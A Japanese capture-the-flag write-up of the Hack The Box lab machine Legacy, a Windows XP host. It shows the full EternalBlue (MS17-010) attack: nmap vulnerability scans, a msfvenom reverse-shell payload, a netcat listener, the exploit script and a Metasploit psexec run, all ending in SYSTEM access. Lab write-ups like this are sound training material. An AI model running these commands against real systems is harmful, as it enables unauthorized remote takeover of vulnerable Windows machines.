# はじめに
Hack The Boxの攻略などを自分用にまとめたものです。  
主に記録用として記しています。  
Twitter:@yukitsukai1731  

# Legacy
HackTheBox公式より  
![スクリーンショット 2020-06-03 15.58.48.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/378e11c1-8054-b3cd-2b7c-19443ae81ff8.png)


Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.

Legacyは、Windows上のSMBの潜在的なセキュリティリスクを示す、かなり簡単な初心者レベルのマシンです。管理者アクセスを得るために必要なのは、一般に公開されているエクスプロイトの一つだけです。

# スキャン
Lame(10.10.10.4)に対して、スキャンを行います。
まずnmapからスキャンを開始します。
## nmap 
```
nmap -sC -sV -Pn -oN legacy.nmap 10.10.10.4
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力
- -Pn...ping送信をせずにスキャンを行う

```
kali@kali:~/htb/Legacy$ cat legacy.nmap 
# Nmap 7.80 scan initiated Wed Jun  3 02:13:24 2020 as: nmap -sC -sV -Pn -oA legacy 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up (0.25s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h30m15s, deviation: 2h07m16s, median: 4d23h00m15s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:b4:31 (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-06-08T11:14:03+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

ここでOSがWindows XPであり、139，445ポートが空いていることが分かります。
nmapのvulnスクリプトを用いて、smbの脆弱性があるかどうか検出してみましょう。

```
nmap -Pn -script smb-vuln* -p 139,445 10.10.10.4
```

```
kali@kali:~/htb/Legacy$ nmap -Pn -script smb-vuln* -p 139,445 10.10.10.4
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-03 03:05 EDT
Nmap scan report for 10.10.10.4
Host is up (0.25s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: SMB: Failed to receive bytes: ERROR
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 7.73 seconds
```

# 侵入
metasploitを利用してMS08-067,MS17-010に関するモジュールを使うととても簡単に管理者権限が手に入ります。
なので、今回はmetasploitを使わずにMS17-010であるEternalBlueの脆弱性を利用して侵入しましょう.
まずはgitを使ってMS17-010のエクスプロイトをクローンします。

```
git clone https://github.com/helviojunior/MS17-010.git
```

次にmsfvenomを使用してLegacyへ送るリバースシェルをするためのマルウェアを作成します。

```
kali@kali:~/MS17-010$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=8888 -f exe > exploit.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

最後にリバースシェルを受信するためにnetcatを用いて待ち受けておきます。

```
kali@kali:~$ nc -lvp 8888
listening on [any] 8888 ...
```

これで準備が整って、侵入を開始するわけですが、ここで一つ問題が起こりました。
この中のsend_and_execute.pyを使用して侵入を開始しようとしますが、impacketモジュールがインストールされていないと警告が出ます。

```
kali@kali:~/MS17-010$ python send_and_execute.py 10.10.10.4 exploit.exe 
Traceback (most recent call last):
  File "send_and_execute.py", line 2, in <module>
    from impacket import smb, smbconnection
ImportError: No module named impacket
```

なので、impacketもダウンロードしてきてpipでインストールしましょう。
僕の使用しているkaliではpipも入っていなかったので、pipもインストールしておきます。

```
$ sudo apt install python-pip
```

```
$ wget https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_21/impacket-0.9.21.tar.gz
$ tar -zxvf impacket-0.9.21.tar.gz
$ cd impacket-0.9.21
$ pip install .
```

これで準備は完了です。
send_and_execute.pyを実行しましょう。

```:実行
kali@kali:~/MS17-010$ python send_and_execute.py 10.10.10.4 exploit.exe
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x822c06c8
SESSION: 0xe1173410
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe2357b10
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe2357bb0
overwriting token UserAndGroups
Sending file HHZ9QK.exe...
Opening SVCManager on 10.10.10.4.....
Creating service PHfu.....
Starting service PHfu.....
The NETBIOS connection with the remote host timed out.
Removing service PHfu.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
kali@kali:~/MS17-010$ 
```


```:待ち受け
kali@kali:~$ nc -lvp 8888
listening on [any] 8888 ...
10.10.10.4: inverse host lookup failed: Unknown host
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.4] 1091
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\WINDOWS\system32>
```

これでシェルを取ることはできましたが、whoamiが入っていないため権限を確認することができません。
なのでkaliでsmbserverを立ててwhoami.exeを共有しましょう。
まずはkaliの中に入っているsmbserverスクリプトとwhoami.exeを探します。
*もしもこのサーバがwindows7以降ならPowershellなどがおそらくインストールされているためそちらを使います。今回はWindows XPなのでwhoami.exeを共有する方法としてsmbを選びました。

```
kali@kali:~$ locate smbserver
/usr/bin/impacket-smbserver
/usr/lib/python3/dist-packages/impacket/smbserver.py
/usr/lib/python3/dist-packages/impacket/__pycache__/smbserver.cpython-37.pyc
/usr/lib/python3/dist-packages/impacket/__pycache__/smbserver.cpython-38.pyc
/usr/share/doc/python3-impacket/examples/smbserver.py
```

```
kali@kali:~$ locate whoami
/usr/bin/ldapwhoami
/usr/bin/whoami
/usr/share/bash-completion/completions/ldapwhoami
/usr/share/man/man1/ldapwhoami.1.gz
/usr/share/man/man1/whoami.1.gz
/usr/share/windows-resources/binaries/whoami.exe
```


次にsmbserver.pyを使って共有フォルダtempを作成し/usr/share/windows-resources/binaries/以下を共有します。

```
kali@kali:~$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp /usr/share/windows-resources/binaries
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

最後にさきほど獲得したシェルからwhoami.exeを参照します。

```
C:\WINDOWS\system32>\\10.10.14.7\temp\whoami.exe
\\10.10.14.7\temp\whoami.exe
NT AUTHORITY\SYSTEM
```

NT AUTHORITY\SYSTEMだということが分かったのでこれで終了です。



# おまけ
おまけとしてmetasploitを使ってMS17-010の脆弱性を突いてみました。
RHOSTの設定だけでいいので、めちゃくちゃ簡単に侵入できます。
まずは、searchコマンドを使ってms17-010で使えそうなモジュールを探しましょう。

```
msf5 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

上記に出てきたexploit/windows/smb/ms17_010_psexecを使用してみましょう。

```
msf5 > use exploit/windows/smb/ms17_010_psexec 
msf5 exploit(windows/smb/ms17_010_psexec) > set RHOST 10.10.10.4
RHOST => 10.10.10.4
msf5 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.7:4444 
[*] 10.10.10.4:445 - Target OS: Windows 5.1
[*] 10.10.10.4:445 - Filling barrel with fish... done
[*] 10.10.10.4:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 10.10.10.4:445 -    [*] Preparing dynamite...
[*] 10.10.10.4:445 -            [*] Trying stick 1 (x86)...Boom!
[*] 10.10.10.4:445 -    [+] Successfully Leaked Transaction!
[*] 10.10.10.4:445 -    [+] Successfully caught Fish-in-a-barrel
[*] 10.10.10.4:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81e9ada8
[*] 10.10.10.4:445 - Built a write-what-where primitive...
[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.4:445 - Selecting native target
[*] 10.10.10.4:445 - Uploading payload... izDKBpOC.exe
[*] 10.10.10.4:445 - Created \izDKBpOC.exe...
[+] 10.10.10.4:445 - Service started successfully...
[*] Sending stage (176195 bytes) to 10.10.10.4
[*] 10.10.10.4:445 - Deleting \izDKBpOC.exe...
[*] Meterpreter session 1 opened (10.10.14.7:4444 -> 10.10.10.4:1074) at 2020-06-04 06:04:01 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM                           
```
非常に簡単に NT AUTHORITY\SYSTEMが得られました。
